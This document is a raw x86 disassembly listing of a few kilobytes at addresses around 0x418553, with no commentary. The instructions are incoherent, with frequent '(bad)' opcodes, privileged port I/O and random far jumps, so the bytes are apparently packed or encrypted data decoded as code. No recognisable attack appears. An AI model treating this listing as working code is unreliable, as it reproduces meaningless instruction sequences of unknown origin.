  418553:	bound  esi,QWORD PTR [edx-0x45c00a43]
  418559:	inc    ecx
  41855a:	retf   
  41855b:	mov    ecx,0x1d631212
  418560:	mov    eax,ds:0xe1f495f7
  418565:	mov    ebx,0xbec31182
  41856a:	dec    esi
  41856b:	std    
  41856c:	xchg   DWORD PTR [ecx-0x4a633f01],eax
  418572:	cmp    DWORD PTR [edi],ebx
  418574:	adc    ah,BYTE PTR [ecx+esi*1+0x7b5024ba]
  41857b:	ss aad 0x2
  41857e:	mov    ebp,0xb6492112
  418583:	cdq    
  418584:	je     0x41856c
  418586:	lods   eax,DWORD PTR ds:[esi]
  418587:	sbb    al,0x6c
  418589:	or     BYTE PTR [edi],al
  41858b:	fsubr  st,st(7)
  41858d:	mov    eax,ds:0x7aadb4e2
  418592:	xchg   esi,eax
  418593:	arpl   sp,dx
  418595:	mov    dl,0xb6
  418597:	ret    
  418598:	xchg   ecx,eax
  418599:	sbb    al,0x8f
  41859b:	out    dx,eax
  41859c:	or     eax,0xdd7160b5
  4185a1:	jne    0x4185a2
  4185a3:	jmp    0x41852e
  4185a5:	cmp    ebx,DWORD PTR [edi-0x26]
  4185a8:	loopne 0x4185b3
  4185aa:	pop    es
  4185ab:	(bad)
  4185ae:	sbb    DWORD PTR [edx-0x2c],ebp
  4185b1:	clc    
  4185b2:	xchg   esi,eax
  4185b3:	cmp    BYTE PTR [edi-0x17675cf4],bl
  4185b9:	jg     0x4185c4
  4185bb:	adc    al,0xb2
  4185bd:	mov    cs,eax
  4185bf:	mov    ch,0x33
  4185c1:	stos   DWORD PTR es:[edi],eax
  4185c2:	sti    
  4185c3:	mov    al,0xf2
  4185c5:	push   ds
  4185c6:	cs xor eax,0xf40858f3
  4185cc:	ins    DWORD PTR es:[edi],dx
  4185cd:	fidiv  DWORD PTR [edx]
  4185cf:	xchg   BYTE PTR [edx],ch
  4185d1:	ins    BYTE PTR es:[edi],dx
  4185d2:	aas    
  4185d3:	cdq    
  4185d4:	nop
  4185d5:	add    dl,BYTE PTR [edx]
  4185d7:	hlt    
  4185d8:	cmp    bh,BYTE PTR [eax]
  4185da:	and    DWORD PTR [eax+0x2fd92606],0xffffff9d
  4185e1:	cli    
  4185e2:	push   ecx
  4185e3:	mov    eax,ds:0x2324fa3f
  4185e8:	cmp    eax,0x70312df
  4185ed:	cmp    DWORD PTR [ebx-0x17973cad],eax
  4185f3:	sub    DWORD PTR [edx-0x735e5222],ebp
  4185f9:	xor    al,0x72
  4185fb:	das    
  4185fc:	enter  0x9b47,0xc7
  418600:	pushf  
  418601:	dec    ebp
  418602:	sar    ch,cl
  418604:	lods   eax,DWORD PTR ds:[esi]
  418605:	js     0x41865b
  418607:	(bad)
  41860a:	mov    ds:0xa8923fe0,al
  41860f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418610:	jmp    0xbf568ed2
  418615:	and    eax,0x1c470f45
  41861a:	fmul   DWORD PTR [ecx-0x5df9c94a]
  418620:	loope  0x41864c
  418622:	lock push esp
  418624:	in     al,dx
  418625:	xchg   esp,eax
  418626:	ins    BYTE PTR es:[edi],dx
  418627:	hlt    
  418628:	mov    bh,0x65
  41862a:	adc    cl,BYTE PTR [ecx]
  41862c:	ins    BYTE PTR es:[edi],dx
  41862d:	xchg   esp,eax
  41862e:	shl    al,0x85
  418631:	mov    ds:0x598e36d3,eax
  418636:	sbb    ebp,ebp
  418638:	xlat   BYTE PTR ds:[ebx]
  418639:	mov    edx,0xb0985514
  41863e:	add    ecx,DWORD PTR [edx-0x6c]
  418641:	dec    esp
  418642:	aas    
  418643:	jnp    0x418629
  418645:	xchg   DWORD PTR [ecx-0x5575de56],edx
  41864b:	push   ebp
  41864c:	jae    0x418619
  41864e:	inc    eax
  41864f:	cld    
  418650:	xlat   BYTE PTR ds:[ebx]
  418651:	push   edx
  418652:	repnz add BYTE PTR [ebp+ebx*8+0x3f],cl
  418657:	mov    ecx,0xb1f32f3b
  41865c:	lods   al,BYTE PTR ds:[esi]
  41865d:	xchg   edi,ecx
  41865f:	adc    BYTE PTR [ecx+edx*1],dh
  418662:	inc    esi
  418663:	pusha  
  418664:	lods   al,BYTE PTR ds:[esi]
  418665:	sub    dh,BYTE PTR [ebx]
  418667:	sbb    dl,BYTE PTR [eax+eiz*2-0x2]
  41866b:	pop    ds
  41866c:	pop    ss
  41866d:	inc    eax
  41866e:	retf   
  41866f:	pop    esi
  418670:	pop    edx
  418671:	out    dx,al
  418672:	sub    eax,0x9c39628e
  418677:	ficomp WORD PTR [eax]
  418679:	jno    0x4186b8
  41867b:	mov    eax,ds:0x46ebea89
  418680:	nop
  418681:	mov    cl,0xa1
  418683:	cmp    esp,0xf9284d1
  418689:	jnp    0x418681
  41868b:	xor    al,ch
  41868d:	xor    eax,0x51ae92cc
  418692:	out    dx,eax
  418693:	pop    ebx
  418694:	mov    cl,0x5e
  418696:	aas    
  418697:	mov    edi,0x67eba61c
  41869c:	mov    esp,edi
  41869e:	lahf   
  41869f:	stos   BYTE PTR es:[edi],al
  4186a0:	sbb    eax,0x91a5cf7c
  4186a5:	or     bh,BYTE PTR [ecx-0x1]
  4186a8:	lods   eax,DWORD PTR ds:[esi]
  4186a9:	inc    esp
  4186aa:	push   esp
  4186ac:	dec    ebx
  4186ad:	add    al,BYTE PTR [ebx]
  4186af:	and    al,0xc4
  4186b1:	in     al,dx
  4186b2:	pusha  
  4186b3:	pop    esp
  4186b4:	or     eax,0x389fb102
  4186b9:	idiv   DWORD PTR [ebx]
  4186bb:	bound  eax,QWORD PTR [esi-0x15]
  4186be:	xchg   ebp,eax
  4186bf:	(bad)  
  4186c1:	mov    BYTE PTR [edi-0x4b7d3f4f],al
  4186c7:	leave  
  4186c8:	pop    ebx
  4186c9:	cmc    
  4186ca:	jmp    0x28e8:0x60e77a50
  4186d1:	lods   al,BYTE PTR ds:[esi]
  4186d2:	jmp    0x43c6:0x49d79971
  4186d9:	ret    
  4186da:	pusha  
  4186db:	dec    ebx
  4186dc:	pop    edx
  4186dd:	ror    dl,1
  4186df:	sbb    ah,BYTE PTR [ecx]
  4186e1:	or     eax,0x7585da49
  4186e6:	nop
  4186e7:	xchg   ah,cl
  4186e9:	inc    ebp
  4186ea:	sub    cl,al
  4186ec:	mov    ecx,0xb420606c
  4186f1:	rol    BYTE PTR [esi-0x31],cl
  4186f4:	mov    ebx,0x9ee5df91
  4186f9:	cli    
  4186fa:	out    0x2b,eax
  4186fc:	repnz neg ch
  4186ff:	pop    es
  418700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418701:	xchg   ecx,eax
  418702:	int    0x83
  418704:	xchg   ebp,eax
  418705:	pop    ds
  418706:	xor    BYTE PTR [ecx],bl
  418708:	test   eax,0xa2e2a939
  41870d:	(bad)  
  41870e:	push   eax
  41870f:	hlt    
  418710:	lea    edx,[edi+eax*1]
  418713:	add    al,0x13
  418715:	test   DWORD PTR [esi+ebx*2],esp
  418718:	fisubr WORD PTR [eax+0x5d44ea0f]
  41871e:	add    eax,0xd6bc3819
  418723:	shl    edx,cl
  418725:	shl    BYTE PTR [eax],cl
  418727:	add    ebx,esi
  418729:	fsub   st(4),st
  41872b:	(bad)  
  41872c:	mov    ah,0x1d
  41872e:	pop    ebx
  41872f:	pop    ss
  418730:	and    BYTE PTR ds:0x3be67470,al
  418736:	ins    BYTE PTR es:[edi],dx
  418737:	mov    ch,0x43
  418739:	fnsave [ebx-0x12]
  41873c:	scas   al,BYTE PTR es:[edi]
  41873d:	push   esp
  41873e:	sbb    DWORD PTR [ebp+0x1103462f],esi
  418744:	retf   0x95f2
  418747:	(bad)  
  41874a:	test   al,0x41
  41874c:	(bad)  
  41874d:	in     eax,dx
  41874e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41874f:	fwait
  418750:	lock clc 
  418752:	xchg   ebp,eax
  418753:	mov    ds,WORD PTR [esp+edx*8+0x527f3f5c]
  41875a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41875b:	(bad)  
  41875c:	cmp    al,0xb1
  41875e:	push   esp
  41875f:	mov    ebp,0x20856c10
  418764:	xor    DWORD PTR [eax],0x6c05d5
  41876a:	sub    esi,esi
  41876c:	jnp    0x41871e
  41876e:	arpl   bx,ax
  418770:	add    ah,cl
  418772:	add    DWORD PTR [eax],0x90ae9f7c
  418778:	dec    ebx
  418779:	xchg   edi,eax
  41877a:	fstp   QWORD PTR ds:0x43ec28ef
  418780:	add    DWORD PTR [edi-0x39b5e2a4],esi
  418786:	and    edx,DWORD PTR [ebx+0x504f498a]
  41878c:	push   ebx
  41878d:	xor    DWORD PTR [edi+0x22afbe2c],esi
  418793:	or     ebx,edi
  418795:	je     0x41878f
  418797:	and    BYTE PTR [edi-0x2597ec11],ah
  41879d:	in     al,dx
  41879e:	sub    eax,0xd366bd54
  4187a3:	out    dx,al
  4187a4:	cmp    dh,BYTE PTR [eax]
  4187a6:	sub    BYTE PTR [edx-0x4d],bh
  4187a9:	mov    esp,0x8dd908d3
  4187ae:	or     al,BYTE PTR [edx-0x6e9fc183]
  4187b4:	add    eax,0x550e77f6
  4187b9:	int    0x94
  4187bb:	scas   eax,DWORD PTR es:[edi]
  4187bc:	inc    esi
  4187bd:	mov    bl,al
  4187bf:	test   BYTE PTR [eax+0x6d],bh
  4187c2:	jecxz  0x4187f9
  4187c4:	cmp    DWORD PTR [eax+0x59b76308],ebp
  4187ca:	ins    BYTE PTR es:[edi],dx
  4187cb:	xchg   DWORD PTR [ebp-0x1b],ebp
  4187ce:	cwde   
  4187cf:	mov    al,0xd3
  4187d1:	sti    
  4187d2:	inc    bh
  4187d4:	pop    ds
  4187d5:	adc    al,bl
  4187d7:	mov    esi,0x719dcdbd
  4187dc:	lahf   
  4187dd:	push   es
  4187de:	mov    WORD PTR [ecx],cs
  4187e0:	xor    esi,DWORD PTR [ecx+0x77]
  4187e3:	or     bh,BYTE PTR [edi]
  4187e5:	pushf  
  4187e6:	and    eax,0x8fc98e22
  4187eb:	pop    edi
  4187ec:	leave  
  4187ed:	loope  0x418774
  4187ef:	neg    BYTE PTR [edi+0x2c]
  4187f2:	jle    0x418846
  4187f4:	in     al,dx
  4187f5:	cli    
  4187f6:	pusha  
  4187f7:	cwde   
  4187f8:	xor    al,0xe5
  4187fa:	mov    ah,BYTE PTR ds:0x72bdd88e
  418800:	add    al,0x77
  418802:	mov    al,0xbc
  418804:	inc    eax
  418805:	lahf   
  418806:	pusha  
  418807:	add    ebx,DWORD PTR [edi+0x51]
  41880a:	bound  ebp,QWORD PTR [edi+0x24667737]
  418810:	jmp    0x1027:0xf48e9a3f
  418817:	xchg   esi,eax
  418818:	xor    DWORD PTR [edi+0x137527f],0x6cc00168
  418822:	cmp    BYTE PTR [eax],dh
  418824:	gs dec esi
  418826:	ret    
  418827:	(bad)  
  418828:	sti    
  418829:	popf   
  41882a:	outs   dx,BYTE PTR ds:[esi]
  41882b:	cld    
  41882c:	adc    dh,ah
  41882e:	mov    bl,0x5e
  418830:	mov    ?,WORD PTR [edi]
  418832:	jle    0x4188a1
  418834:	call   0xafbe284f
  418839:	and    DWORD PTR [ebx-0x508b623c],ecx
  41883f:	je     0x418826
  418841:	clc    
  418842:	iret   
  418843:	shl    DWORD PTR [edi+ecx*2+0x45adc2e7],1
  41884a:	lds    ecx,FWORD PTR [eax]
  41884c:	fwait
  41884d:	jge    0x41883e
  41884f:	xor    DWORD PTR [edx-0x28dd382a],ebx
  418855:	mov    ?,WORD PTR [ebp-0x2e52546a]
  41885b:	lods   eax,DWORD PTR ds:[esi]
  41885c:	mov    al,0x13
  41885e:	inc    ebp
  41885f:	inc    esp
  418860:	fsubr  DWORD PTR [eax-0x64]
  418863:	(bad)  
  418864:	out    dx,al
  418865:	mov    edi,DWORD PTR [esi]
  418867:	shl    BYTE PTR [edx],0x3c
  41886a:	dec    edi
  41886b:	dec    ecx
  41886c:	xor    ebp,DWORD PTR [eax]
  41886e:	ss pop esp
  418870:	sub    al,0x14
  418872:	mov    esp,DWORD PTR [esi+0x1a35b7bb]
  418878:	push   esi
  418879:	dec    esp
  41887a:	(bad)  
  41887b:	into   
  41887c:	inc    ebx
  41887d:	mov    eax,ds:0xdf952acf
  418882:	enter  0x6ba4,0x8a
  418886:	dec    esp
  418887:	fld    TBYTE PTR [esi]
  418889:	add    al,0xbe
  41888b:	add    dh,BYTE PTR [ecx+ecx*8-0x1a]
  41888f:	cmc    
  418890:	icebp  
  418891:	retf   0xb050
  418894:	pop    edi
  418895:	pusha  
  418896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418897:	(bad)  
  418898:	cmc    
  418899:	adc    DWORD PTR [eax+0x39a2c3f6],ebx
  41889f:	dec    edx
  4188a0:	sub    ebp,DWORD PTR [edi-0x1347ed99]
  4188a6:	stos   BYTE PTR es:[edi],al
  4188a7:	lods   al,BYTE PTR ds:[esi]
  4188a8:	add    BYTE PTR [eax+0x63fc5e5b],dl
  4188ae:	in     al,0x43
  4188b0:	mov    al,0xf6
  4188b2:	or     al,dl
  4188b4:	out    0x46,al
  4188b6:	pop    eax
  4188b7:	test   al,0x3f
  4188b9:	cmp    edi,ecx
  4188bb:	push   cs
  4188bc:	fsub   st(4),st
  4188be:	cmp    DWORD PTR ds:0xbd018f7e,ebx
  4188c4:	popf   
  4188c5:	xchg   edx,eax
  4188c6:	arpl   WORD PTR [ecx],sp
  4188c8:	in     eax,0x92
  4188ca:	xlat   BYTE PTR ds:[ebx]
  4188cb:	mov    ecx,0x1fbb0441
  4188d0:	fld    st(3)
  4188d2:	das    
  4188d3:	fbstp  TBYTE PTR [si+0x77]
  4188d7:	lods   al,BYTE PTR ds:[esi]
  4188d8:	adc    edx,DWORD PTR [eax]
  4188da:	gs into 
  4188dc:	pop    esp
  4188dd:	adc    ah,ch
  4188df:	xchg   ecx,eax
  4188e0:	jmp    0x782d:0x8e40a9dd
  4188e7:	jle    0x4188b1
  4188e9:	ss jns 0x4188ad
  4188ec:	jmp    0xd0864d42
  4188f1:	fwait
  4188f2:	and    bl,BYTE PTR [edx+eiz*4]
  4188f5:	xor    ebx,DWORD PTR [ecx+ebx*2]
  4188f8:	sbb    DWORD PTR [eax],ebp
  4188fa:	and    BYTE PTR [ebp-0x1c],bl
  4188fd:	pop    esp
  4188fe:	and    al,0x73
  418900:	clc    
  418901:	sbb    esi,0x78
  418904:	pop    ebp
  418905:	add    DWORD PTR [edi],edx
  418907:	out    0x87,eax
  418909:	int    0x8c
  41890b:	leave  
  41890c:	scas   eax,DWORD PTR es:[edi]
  41890d:	je     0x4188fd
  41890f:	(bad)  [edx]
  418911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418912:	ret    0x1e15
  418915:	cmp    bh,dl
  418917:	lahf   
  418918:	mov    ecx,0x71bec78b
  41891d:	lock sub ebp,DWORD PTR [edi-0x7f063221]
  418924:	neg    edi
  418926:	mov    BYTE PTR gs:[ebx-0x24269d2b],ah
  41892d:	cmp    edx,DWORD PTR [eax]
  41892f:	pop    ecx
  418930:	sub    DWORD PTR [eax],edi
  418932:	add    esi,DWORD PTR [ecx+eax*1-0x5daf7413]
  418939:	sub    al,0xbd
  41893b:	fadd   st(1),st
  41893d:	mov    dl,0x85
  41893f:	inc    esi
  418940:	cmp    cl,BYTE PTR [edi]
  418942:	sub    DWORD PTR [eax+0x3396a633],ebx
  418948:	shl    DWORD PTR [edi],cl
  41894a:	fcomp  QWORD PTR [ecx]
  41894c:	add    al,0xd8
  41894e:	jns    0x41894f
  418950:	cwde   
  418951:	ret    
  418952:	test   al,0xd3
  418954:	jmp    DWORD PTR [ecx+0x143011a0]
  41895a:	ins    DWORD PTR es:[edi],dx
  41895b:	enter  0x3bdb,0x41
  41895f:	sbb    BYTE PTR ds:0xe94c10fb,cl
  418965:	jnp    0x418907
  418967:	inc    ecx
  418968:	jmp    0x583c1908
  41896d:	mov    es,esi
  41896f:	jbe    0x4189cf
  418971:	and    eax,0xcde09a02
  418976:	mov    eax,ds:0x74ae8780
  41897b:	jmp    0x418921
  41897d:	out    0x57,al
  41897f:	pop    ebp
  418980:	outs   dx,DWORD PTR ds:[esi]
  418981:	bound  ecx,QWORD PTR [edi+ecx*2]
  418984:	pop    esp
  418985:	push   eax
  418986:	adc    BYTE PTR [edi+0x7a],0x2c
  41898a:	in     al,dx
  41898b:	or     eax,DWORD PTR [ecx]
  41898d:	pop    ds
  41898e:	test   al,0xf1
  418990:	in     eax,0xd7
  418992:	adc    DWORD PTR [edi+0x51],ebp
  418995:	aam    0xb0
  418997:	mov    bh,0xf5
  418999:	mov    ch,0x5f
  41899b:	push   esp
  41899c:	jbe    0x418a02
  41899e:	stos   DWORD PTR es:[edi],eax
  41899f:	add    al,0xef
  4189a1:	add    BYTE PTR [esi+0x6061c9a],cl
  4189a7:	pusha  
  4189a8:	cmp    DWORD PTR [esi+eiz*4],0x77018145
  4189af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189b0:	repnz adc esp,DWORD PTR fs:[esp+esi*2-0x2e]
  4189b6:	cmp    DWORD PTR [ecx-0x4f],esi
  4189b9:	ins    DWORD PTR es:[edi],dx
  4189ba:	mov    ch,0x3b
  4189bc:	mov    ecx,0x6ef9c7b8
  4189c1:	and    DWORD PTR [eax],esp
  4189c3:	mov    esi,0x64fc82ad
  4189c8:	mov    WORD PTR [edi],?
  4189ca:	pop    edx
  4189cb:	inc    esp
  4189cc:	push   es
  4189cd:	mov    ah,0x33
  4189cf:	(bad)  
  4189d0:	scas   al,BYTE PTR es:[edi]
  4189d1:	sub    DWORD PTR [ecx-0x6e69a03],edx
  4189d7:	add    eax,0x3ffca2ed
  4189dc:	mov    dh,0x60
  4189de:	xor    eax,0x7be719a8
  4189e3:	in     eax,dx
  4189e4:	jmp    FWORD PTR [edi]
  4189e6:	xor    edi,eax
  4189e8:	outs   dx,DWORD PTR ds:[esi]
  4189e9:	stos   DWORD PTR es:[edi],eax
  4189ea:	lahf   
  4189eb:	adc    DWORD PTR [edi-0x29],ebx
  4189ee:	(bad)  
  4189ef:	mov    ch,0xd5
  4189f1:	in     eax,dx
  4189f2:	js     0x418a3c
  4189f4:	xchg   ecx,eax
  4189f5:	scas   eax,DWORD PTR es:[edi]
  4189f6:	pushf  
  4189f7:	mov    gs,WORD PTR [esi-0x1824a68c]
  4189fd:	cmp    BYTE PTR [edi],0x30
  418a00:	(bad)  
  418a02:	add    dh,BYTE PTR [ebp+eax*2-0x67]
  418a06:	paddb  mm3,QWORD PTR [ebx+esi*1]
  418a0a:	sahf   
  418a0b:	scas   al,BYTE PTR es:[edi]
  418a0c:	in     eax,0x52
  418a0e:	stos   DWORD PTR es:[edi],eax
  418a0f:	jl     0x4189e6
  418a11:	nop
  418a12:	icebp  
  418a13:	retf   
  418a14:	push   eax
  418a15:	out    dx,al
  418a16:	popfw  
  418a18:	mov    BYTE PTR [edx+0x5589d477],bh
  418a1e:	pop    ss
  418a1f:	jp     0x418a3d
  418a21:	into   
  418a22:	xor    al,0x45
  418a24:	cld    
  418a25:	outs   dx,DWORD PTR ds:[esi]
  418a26:	lods   al,BYTE PTR ds:[esi]
  418a27:	fdivp  st(0),st
  418a29:	sbb    DWORD PTR [eax-0x25596861],0xffffffde
  418a30:	xchg   esi,eax
  418a31:	inc    esi
  418a32:	test   al,0xc7
  418a34:	mov    esi,0x79d1679
  418a39:	sub    al,0x98
  418a3b:	sahf   
  418a3c:	sar    BYTE PTR [ebx],0xd5
  418a3f:	pop    ebx
  418a40:	mov    eax,0xc71044cc
  418a45:	pop    edx
  418a46:	inc    eax
  418a47:	ror    dl,cl
  418a49:	adc    bl,BYTE PTR ds:[edx+0xd]
  418a4d:	mov    edx,0xac441521
  418a52:	xchg   al,dl
  418a54:	call   0xa718:0x732f788f
  418a5b:	scas   eax,DWORD PTR es:[edi]
  418a5c:	pop    ds
  418a5d:	jmp    0x418a51
  418a5f:	cmp    esi,edx
  418a61:	mov    bh,0x41
  418a63:	mov    eax,0x8cf8f6d5
  418a68:	cmp    BYTE PTR [ebp-0x38],dh
  418a6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a6c:	lods   eax,DWORD PTR ds:[esi]
  418a6d:	dec    ebp
  418a6e:	test   BYTE PTR [eax+0x53bd13b7],bh
  418a74:	dec    ebx
  418a75:	mov    ss,edi
  418a77:	lfs    ecx,FWORD PTR [edi-0x2996a979]
  418a7e:	cwde   
  418a7f:	addr16 push esp
  418a81:	sahf   
  418a82:	mov    bl,0xe0
  418a84:	loopne 0x418a9f
  418a86:	adc    DWORD PTR ss:[eax],0x7a
  418a8a:	cmp    al,BYTE PTR [esi-0x55]
  418a8d:	push   edi
  418a8e:	cli    
  418a8f:	or     al,0xd
  418a91:	cmp    al,0xb4
  418a93:	imul   BYTE PTR [edi]
  418a95:	xor    DWORD PTR [edi+0x21],esp
  418a98:	test   edx,ecx
  418a9a:	das    
  418a9b:	pop    ecx
  418a9c:	in     al,dx
  418a9d:	scas   al,BYTE PTR es:[edi]
  418a9e:	lds    edx,FWORD PTR ds:0x2bf05800
  418aa4:	imul   ebp,edx,0xb48daae8
  418aaa:	xchg   edx,eax
  418aab:	sysexit 
  418aad:	in     eax,0x33
  418aaf:	xlat   BYTE PTR ds:[ebx]
  418ab0:	lds    ecx,FWORD PTR [ebx-0x36bb806]
  418ab6:	sbb    bh,dl
  418ab8:	jno    0x418aba
  418aba:	mov    ebx,0xc2ba3da0
  418abf:	xor    DWORD PTR [esi-0x1d8565d3],edi
  418ac5:	cdq    
  418ac6:	(bad)  [edx]
  418ac8:	lock sbb DWORD PTR [edx-0x63],0x67
  418acd:	(bad)  
  418ace:	call   0x8ab64c47
  418ad3:	jg     0x418b3c
  418ad5:	jns    0x418a87
  418ad7:	xor    eax,0xb5061fd6
  418adc:	imul   ecx,DWORD PTR [ebx+0x7c],0x23220cae
  418ae3:	xor    bl,BYTE PTR [eax]
  418ae5:	gs loope 0x418a9e
  418ae8:	ins    BYTE PTR es:[edi],dx
  418ae9:	push   cs
  418aea:	(bad)  
  418aeb:	add    al,0xa2
  418aed:	dec    ecx
  418aee:	xor    esp,DWORD PTR [ecx]
  418af0:	pop    edx
  418af1:	rcr    BYTE PTR [esi+esi*4-0xe],0xfa
  418af6:	outs   dx,DWORD PTR ds:[esi]
  418af7:	dec    eax
  418af8:	ja     0x418a7b
  418afa:	jp     0x418acd
  418afc:	push   ebp
  418afd:	and    esp,DWORD PTR [ecx]
  418aff:	or     eax,esp
  418b01:	stos   DWORD PTR es:[edi],eax
  418b02:	jle    0x418aa3
  418b04:	in     al,0x18
  418b06:	sti    
  418b07:	test   BYTE PTR [ecx+0x7e02422f],0xa3
  418b0e:	popf   
  418b0f:	(bad)  
  418b10:	jmp    0x775f955d
  418b15:	and    DWORD PTR [ecx],edi
  418b17:	nop
  418b18:	push   ebp
  418b19:	jb     0x418ad2
  418b1b:	dec    ebp
  418b1c:	cmc    
  418b1d:	mov    ebp,0xc845e831
  418b22:	ret    
  418b23:	add    eax,0xda7a45e6
  418b28:	jge    0x418b5f
  418b2a:	dec    edi
  418b2b:	pop    ebx
  418b2c:	adc    bl,dh
  418b2e:	cmp    edx,DWORD PTR [ecx]
  418b30:	ficomp WORD PTR ds:0x1d62d1ff
  418b36:	sbb    DWORD PTR [ebp-0x56],ebx
  418b39:	call   0xf3a7:0xf58726b8
  418b40:	push   ss
  418b41:	cmp    ch,BYTE PTR [ebp-0x3abf9184]
  418b47:	cld    
  418b48:	(bad)  
  418b49:	(bad)  
  418b4a:	add    eax,DWORD PTR [ebp-0x44782b91]
  418b50:	or     ebp,esp
  418b52:	popa   
  418b53:	dec    ebx
  418b54:	jg     0x418bbd
  418b56:	push   esp
  418b57:	(bad)  
  418b58:	dec    esi
  418b59:	(bad)  
  418b5a:	ins    BYTE PTR es:[edi],dx
  418b5b:	pop    edx
  418b5c:	aaa    
  418b5d:	ret    0xc64e
  418b60:	jae    0x418af8
  418b62:	adc    edx,DWORD PTR [ebx-0x2129ea5b]
  418b68:	cmp    esi,DWORD PTR fs:[eax-0x3965cfc7]
  418b6f:	lods   eax,DWORD PTR ds:[esi]
  418b70:	(bad)  
  418b72:	lods   al,BYTE PTR ds:[esi]
  418b73:	pop    edi
  418b74:	sub    BYTE PTR [esi],ch
  418b76:	rcl    bl,0x3b
  418b79:	cld    
  418b7a:	push   0x3f
  418b7c:	aas    
  418b7d:	dec    esi
  418b7e:	js     0x418b04
  418b80:	mov    al,ds:0xc50f3330
  418b85:	lds    esi,FWORD PTR [esi+0x435bc15a]
  418b8b:	jmp    DWORD PTR [edx]
  418b8d:	ins    BYTE PTR es:[edi],dx
  418b8e:	pop    es
  418b8f:	sti    
  418b90:	push   esi
  418b91:	cs into 
  418b93:	or     ah,BYTE PTR [ebx-0x80]
  418b96:	ret    0xbba8
  418b99:	retf   
  418b9a:	inc    eax
  418b9b:	mov    eax,0x6cf426fa
  418ba0:	mov    cl,0x79
  418ba2:	lods   al,BYTE PTR ds:[esi]
  418ba3:	ja     0x418c0c
  418ba5:	jp     0x418bbd
  418ba7:	sbb    dl,BYTE PTR [edi+0x62]
  418baa:	in     eax,dx
  418bab:	inc    ebx
  418bac:	or     DWORD PTR [edi+0x6c],ebx
  418baf:	xor    BYTE PTR [edx],ch
  418bb1:	pushf  
  418bb2:	gs jnp 0x418c0d
  418bb5:	mov    eax,0xfc67ebf3
  418bba:	in     al,0xf1
  418bbc:	aad    0xef
  418bbe:	jmp    0xaf05a0aa
  418bc3:	sbb    al,0x79
  418bc5:	shl    DWORD PTR [esi],1
  418bc7:	xor    dl,cl
  418bc9:	scas   al,BYTE PTR es:[edi]
  418bca:	sub    BYTE PTR [eax+0x4adf480e],cl
  418bd0:	not    BYTE PTR [eax]
  418bd2:	sahf   
  418bd3:	or     dl,BYTE PTR [ebx+0x64]
  418bd6:	outs   dx,BYTE PTR ds:[esi]
  418bd7:	in     eax,dx
  418bd8:	vdivsd xmm7,xmm6,QWORD PTR [esi-0x57]
  418bdd:	retf   
  418bde:	push   edi
  418bdf:	pop    ds
  418be0:	shr    BYTE PTR [esi+0x4427512b],cl
  418be6:	and    ecx,edx
  418be8:	out    dx,eax
  418be9:	pusha  
  418bea:	fidiv  DWORD PTR [edi+0x1e]
  418bed:	dec    edi
  418bee:	pop    ebp
  418bef:	ds adc dh,dl
  418bf2:	pop    ss
  418bf3:	hlt    
  418bf4:	adc    eax,0xb01f7ffc
  418bf9:	mov    eax,0xd9f9eab1
  418bfe:	scas   eax,DWORD PTR es:[edi]
  418bff:	fdivr  DWORD PTR [eax+ebp*2+0x1f5dfd31]
  418c06:	arpl   bp,dx
  418c08:	inc    eax
  418c09:	sbb    DWORD PTR [edx-0x74],0xe432fc99
  418c10:	test   eax,0xf672e8f4
  418c15:	pushf  
  418c16:	scas   eax,DWORD PTR es:[edi]
  418c17:	push   eax
  418c18:	sar    DWORD PTR [edi],cl
  418c1a:	xchg   esi,eax
  418c1b:	int3   
  418c1c:	add    BYTE PTR [eax-0x31],bh
  418c1f:	popf   
  418c20:	sub    esp,eax
  418c22:	adc    BYTE PTR [ebx],ah
  418c24:	mov    edx,0x1dd07d4e
  418c29:	retf   
  418c2a:	and    eax,0xb6fc656b
  418c2f:	shl    DWORD PTR [ecx],cl
  418c31:	adc    DWORD PTR [ebx+ecx*8],edi
  418c34:	and    al,0x49
  418c36:	test   BYTE PTR [eax],ch
  418c38:	adc    eax,DWORD PTR [ecx+0x7f7884b2]
  418c3e:	test   al,0xc3
  418c40:	(bad)  
  418c41:	ja     0x418c7c
  418c43:	add    al,0x23
  418c45:	(bad)  
  418c46:	jno    0x418cb1
  418c48:	mov    BYTE PTR [ebx-0x5b746a2a],al
  418c4e:	fsub   QWORD PTR [eax]
  418c50:	fild   DWORD PTR [esi-0x80]
  418c53:	jecxz  0x418c20
  418c55:	sub    al,0xec
  418c57:	loop   0x418c43
  418c59:	dec    ebx
  418c5a:	sbb    DWORD PTR [edx+0x312442c5],esi
  418c60:	jmp    0x418bf6
  418c62:	out    0x5a,eax
  418c64:	jl     0x418c6c
  418c66:	pop    ds
  418c67:	shr    eax,cl
  418c69:	rcr    BYTE PTR [edx],cl
  418c6b:	mov    edi,0xd2619155
  418c70:	and    DWORD PTR [ecx+0x3e],ecx
  418c73:	shl    BYTE PTR [eax-0x3e],1
  418c76:	xor    BYTE PTR [ebx-0x45],0x1b
  418c7a:	sub    ch,BYTE PTR [ebp-0x3024b8e9]
  418c80:	loop   0x418c8d
  418c82:	les    esi,FWORD PTR [eax]
  418c84:	stc    
  418c85:	fisttp WORD PTR [ebx]
  418c87:	or     BYTE PTR [ebp+edx*4+0x76],al
  418c8b:	sbb    al,0x13
  418c8d:	sub    eax,0xedff1b34
  418c92:	pop    edi
  418c93:	cmp    esi,DWORD PTR [esi-0x10]
  418c96:	pop    esi
  418c97:	hlt    
  418c98:	int    0xc8
  418c9a:	push   0x36
  418c9c:	pop    esi
  418c9d:	sub    BYTE PTR [esp+ecx*1-0x614d1838],cl
  418ca4:	dec    edx
  418ca5:	dec    esi
  418ca6:	jp     0x418c36
  418ca8:	fdivr  QWORD PTR [ebx]
  418caa:	ret    0x64fe
  418cad:	ja     0x418c89
  418caf:	mov    dh,0x31
  418cb1:	rol    DWORD PTR [edx],cl
  418cb3:	stos   BYTE PTR es:[edi],al
  418cb4:	sbb    BYTE PTR [ecx-0x672e4610],ch
  418cba:	jb     0x418cca
  418cbc:	out    0xbf,al
  418cbe:	dec    esp
  418cbf:	add    ecx,DWORD PTR [edx-0x3]
  418cc2:	pop    edx
  418cc3:	adc    eax,0xb8e8f6d3
  418cc8:	pushf  
